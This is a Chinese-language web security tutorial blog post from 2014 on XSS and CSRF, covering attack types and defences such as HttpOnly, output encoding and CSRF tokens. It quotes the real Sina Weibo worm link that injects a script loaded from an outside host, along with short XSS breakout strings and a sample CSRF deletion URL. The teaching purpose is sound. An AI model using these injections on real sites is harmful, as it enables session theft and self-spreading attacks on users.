---
title: 浅谈XSS和CSRF
tags:
  - csrf
  - xss
url: 256.html
id: 256
categories:
  - 程序与生活
  - 经验分享
date: 2014-08-24 14:03:34
---

### 同源策略（Same Origin Policy）

同源策略阻止从一个源加载的文档或脚本获取或设置另一个源加载的文档的属性。

如：

不能通过Ajax获取另一个源的数据；

JavaScript不能访问页面中iframe加载的跨域资源。

对 http://store.company.com/dir/page.html 同源检测

[![28230050-d605bfba1f1b48e081353243800c253c](http://storage.veitor.net/uploads/2014/08/28230050-d605bfba1f1b48e081353243800c253c.png)](http://storage.veitor.net/uploads/2014/08/28230050-d605bfba1f1b48e081353243800c253c.png)

### 跨域限制

1.  浏览器中，script、img、iframe、link等标签，可以跨域引用或加载资源。
2.  不同于 XMLHttpRequest，通过src属性加载的资源，浏览器限制了JavaScript的权限，使其不能读、写返回的内容。
3.  XMLHttpRequest 也受到也同源策略的约束，不能跨域访问资源。

### JSONP

为了解决 XMLHttpRequest 同源策略的局限性，JSONP出现了。

JSONP并不是一个官方的协议，它是利用script标签中src属性具有跨域加载资源的特性，而衍生出来的跨域数据访问方式。

### CORS(Cross-Origin Resource Sharing)

CORS，即：**跨域资源共享**。

这是W3C委员会制定的一个新标准，用于解决 XMLHttpRequest 不能跨域访问资源的问题。目前支持情况良好（特指移动端）。

想了解更多，可查看之前的文章：[《CORS(Cross-Origin Resource Sharing) 跨域资源共享》](http://www.cnblogs.com/maplejan/archive/2012/12/02/2797864.html)

* * *

XSS（Cross Site Script）
----------------------

XSS（Cross Site Script） 即：**跨站脚本攻击**。

本来缩写其应该是CSS，不过为了避免和CSS层叠样式表 （Cascading Style Sheets）重复，所以在安全领域叫做 XSS 。

### XSS 分类

XSS 主要分为两种形态

1.  反射型XSS（非持久型XSS）。需要诱惑用户去激活的XSS攻击，如：点击恶意链接。
2.  存储型XSS。混杂有恶意代码的数据被存储在服务器端，当用户访问输出该数据的页面时，就会促发XSS攻击。具有很强的稳定性。

### XSS Payload

XSS Payload，是指那些用于完成各种具体功能的恶意脚本。

由于实现XSS攻击可以通过JavaScript、ActiveX控件、Flash插件、Java插件等技术手段实现，下面只讨论JavaScript的XSS Payload。

通过JavaScript实现的XSS Payload，一般有以下几种：

1.  Cookie劫持
2.  构造请求
3.  XSS钓鱼
4.  CSS History Hack

### Cookie劫持

由于Cookie中，往往会存储着一些用户安全级别较高的信息，如：用户的登陆凭证。

当用户所访问的网站被注入恶意代码，它只需通过 _document.cookie _这句简单的JavaScript代码，就可以顺利获取到用户当前访问网站的cookies。

如果攻击者能获取到用户登陆凭证的Cookie，甚至可以绕开登陆流程，直接设置这个cookie的值，来访问用户的账号。

### 构造请求

JavaScript 可以通过多种方式向服务器发送GET与POST请求。

网站的数据访问和操作，基本上都是通过向服务器发送请求而实现的。

如果让恶意代码顺利模拟用户操作，向服务器发送有效请求，将对用户造成重大损失。

例如：更改用户资料、删除用户信息等...

### XSS钓鱼

关于网站钓鱼，详细大家应该也不陌生了。

就是伪造一个高度相似的网站，欺骗用户在钓鱼网站上面填写账号密码或者进行交易。

而XSS钓鱼也是利用同样的原理。

注入页面的恶意代码，会弹出一个想死的弹窗，提示用户输入账号密码登陆。

当用户输入后点击发送，这些资料已经去到了攻击者的服务器上了。

如：

[![28231056-882bbad839274f95a635ddbd128db3c4](http://storage.veitor.net/uploads/2014/08/28231056-882bbad839274f95a635ddbd128db3c4.png)](http://storage.veitor.net/uploads/2014/08/28231056-882bbad839274f95a635ddbd128db3c4.png)

### CSS History Hack

CSS History Hack是一个有意思的东西。它结合 浏览器历史记录 和 CSS的伪类：a:visited，通过遍历一个网址列表来获取其中<a>标签的颜色，就能知道用户访问过什么网站。

相关链接：

PS：目前最新版的Chrome、Firefox、Safari已经无效，Opera 和 IE8以下 还可以使用。

### XSS Worm

XSS Worm，即XSS蠕虫，是一种具有自我传播能力的XSS攻击，杀伤力很大。

引发 XSS蠕虫 的条件比较高，需要在用户之间发生交互行为的页面，这样才能形成有效的传播。一般要同时结合 反射型XSS 和 存储型XSS 。

案例：Samy Worm、新浪微博XSS攻击

### 新浪微博XSS攻击

这张图，其实已经是XSS蠕虫传播阶段的截图了。

攻击者要让XSS蠕虫成功被激活，应该是通过 私信 或者 @微博 的方式，诱惑一些微博大号上当。

当这些大号中有人点击了攻击链接后，XSS蠕虫就被激活，开始传播了。

[![28231427-6c93f6962f234f0a8576b1a8979da50e](http://storage.veitor.net/uploads/2014/08/28231427-6c93f6962f234f0a8576b1a8979da50e.png)](http://storage.veitor.net/uploads/2014/08/28231427-6c93f6962f234f0a8576b1a8979da50e.png)

这个XSS的漏洞，其实就是没有对地址中的变量进行过滤。

把上一页的链接decode了之后，我们就可以很容易的看出，这个链接的猫腻在哪里。

链接上带的变量，直接输出页面，导致外部JavaScript代码成功注入。

传播链接：http://weibo.com/pub/star/g/xyyyd%22%3E%3Cscript%20src=//www.2kt.cn/images/t.js%3E%3C/script%3E?type=update

把链接decode之后：http://weibo.com/pub/star/g/xyyyd"><script src=//www.2kt.cn/images/t.js></script>?type=update

[![28231439-beba435e8f8f4a97acdeee43ad981aef (1)](http://storage.veitor.net/uploads/2014/08/28231439-beba435e8f8f4a97acdeee43ad981aef-1.png)](http://storage.veitor.net/uploads/2014/08/28231439-beba435e8f8f4a97acdeee43ad981aef-1.png)

相关XSS代码这里就不贴了，Google一下就有。

其实也要感谢攻击者只是恶作剧了一下，让用户没有造成实际的损失。

网上也有人提到，如果这个漏洞结合XSS钓鱼，再配合隐性传播，那样杀伤力会更大。

* * *

XSS 防御技巧
--------

### HttpOnly

服务器端在设置安全级别高的Cookie时，带上HttpOnly的属性，就能防止JavaScript获取。

PHP设置HttpOnly：

<?
header("Set-Cookie: a=1;", false);
header("Set-Cookie: b=1;httponly", false);
setcookie("c", "1", NULL, NULL, NULL, NULL, ture);

 

PS：手机上的QQ浏览器4.0，居然不支持httponly，而3.7的版本却没问题。测试平台是安卓4.0版本。

估计是一个低级的bug，已经向QQ浏览器那边反映了情。

截止时间：2013-01-28

 

### 输入检查

**任何用户输入的数据，都是“不可信”的。**

输入检查，一般是用于输入格式检查，例如：邮箱、电话号码、用户名这些...

都要按照规定的格式输入：电话号码必须纯是数字和规定长度；用户名除 中英文数字 外，仅允许输入几个安全的符号。

输入过滤不能完全交由前端负责，前端的输入过滤只是为了避免普通用户的错误输入，减轻服务器的负担。

因为攻击者完全可以绕过正常输入流程，直接利用相关接口向服务器发送设置。

所以，前端和后端要做相同的过滤检查。

### 输出检查

相比输入检查，前端更适合做输出检查。

可以看到，HttpOnly和前端没直接关系，输入检查的关键点也不在于前端。

那XSS的防御就和前端没关系了?

当然不是，随着移动端web开发发展起来了，Ajax的使用越来越普遍，越来越多的操作都交给前端来处理。

前端也需要做好XSS防御。

JavaScript直接通过Ajax向服务器请求数据，接口把数据以JSON格式返回。前端整合处理数据后，输出页面。

所以，前端的XSS防御点，在于输出检查。

但也要结合**XSS可能发生的场景**。

### XSS注意场景

**在HTML标签中输出**

如：<a href=# >{$var}</a>

风险：{$var} 为 <img src=# onerror="/xss/" />

防御手段：变量HtmlEncode后输出

**在HTML属性中输出**

如：<div data-num="{$var}"></div>

风险：{$var} 为 " onclick="/xss/

防御手段：变量HtmlEncode后输出

**在<script>标签中输出**

如：<script>var num = {$var};</script>

风险：{$var} 为 1; alert(/xss/)

防御手段：确保输出变量在引号里面，再让变量JavaScriptEncode后输出。

**在事件中输出**

如：<span onclick="fun({$var})">hello!click me!</span>

风险：{$var} 为 ); alert(/xss/); //

防御手段：确保输出变量在引号里面，再让变量JavaScriptEncode后输出。

**在CSS中输出**

一般来说，尽量禁止用户可控制的变量在<style>标签和style属性中输出。

**在地址中输出**

如：<a href="http://3g.cn/?test={$var}">

风险：{$var} 为 " onclick="alert(/xss/)

防御手段：对URL中除 协议(Protocal) 和 主机(Host) 外进行URLEncode。如果整个链接都由变量输出，则需要判断是不是http开头。

### HtmlEncode

对下列字符实现编码

&     ——》    &amp;

<     ——》    &lt;

>     ——》    &gt;

"    ——》    &quot;

'    ——》    &#39; （IE不支持&apos;）

/      ——》    &#x2F;

### JavaScriptEncode

对下列字符加上反斜杠

"    ——》    \\"

'    ——》    \\'

\      ——》    \\\

\\n    ——》    \\\n

\\r     ——》    \\\r      (Windows下的换行符)

例子： "\\\".replace(/\\\/g, "\\\\\\");  //return \\\

推荐一个JavaScript的模板引擎：[**artTemplate**](http://aui.github.com/artTemplate/%20)

### URLEncode

使用以下JS原生方法进行URI编码和解码：

*   encodeURI
*   decodeURI
*   decodeURIComponent
*   encodeURIComponent

* * *

CSRF（Cross-site request forgery）
--------------------------------

[![28232804-51bdd6fb20674c99a3af90124348859c](http://storage.veitor.net/uploads/2014/08/28232804-51bdd6fb20674c99a3af90124348859c.png)](http://storage.veitor.net/uploads/2014/08/28232804-51bdd6fb20674c99a3af90124348859c.png)

 

CSRF 即：**跨站点请求伪造**

网站A ：为恶意网站。

网站B ：用户已登录的网站。

当用户访问 A站 时，A站 私自访问 B站 的操作链接，模拟用户操作。

假设B站有一个删除评论的链接：http://b.com/comment/?type=delete&id=81723

A站 直接访问该链接，就能删除用户在 B站 的评论。

### CSRF 的攻击策略

因为浏览器访问 B站 相关链接时，会向其服务器发送 B站 保存在本地的Cookie，以判断用户是否登陆。所以通过 A站 访问的链接，也能顺利执行。

* * *

CSRF 防御技巧
---------

 

### 验证码

几乎所有人都知道验证码，但验证码不单单用来防止注册机的暴力破解，还可以有效防止CSRF的攻击。

验证码算是对抗CSRF攻击最简洁有效的方法。

但使用验证码的问题在于，不可能在用户的所有操作上都需要输入验证码。

只有一些关键的操作，才能要求输入验证码。

不过随着HTML5的发展。

利用canvas标签，前端也能识别验证码的字符，让CSRF生效。

### Referer Check

Referer Check即来源检测。

HTTP Referer 是 Request Headers 的一部分，当浏览器向web服务器发出请求的时候，一般会带上Referer，告诉服务器用户从哪个站点链接过来的。

服务器通过判断请求头中的referer，也能避免CSRF的攻击。

### Token

CSRF能攻击成功，根本原因是：操作所带的参数均被攻击者猜测到。

既然知道根本原因，我们就对症下药，利用Token。

当向服务器传参数时，带上Token。这个Token是一个随机值，并且由服务器和用户同时持有。

Token可以存放在用户浏览器的Cookie中，

当用户提交表单时带上Token值，服务器就能验证表单和Cookie中的Token是否一致。

（前提，网站没有XSS漏洞，攻击者不能通过脚本获取用户的Cookie）

原文地址：http://www.cnblogs.com/alilang/archive/2013/01/29/2880843.html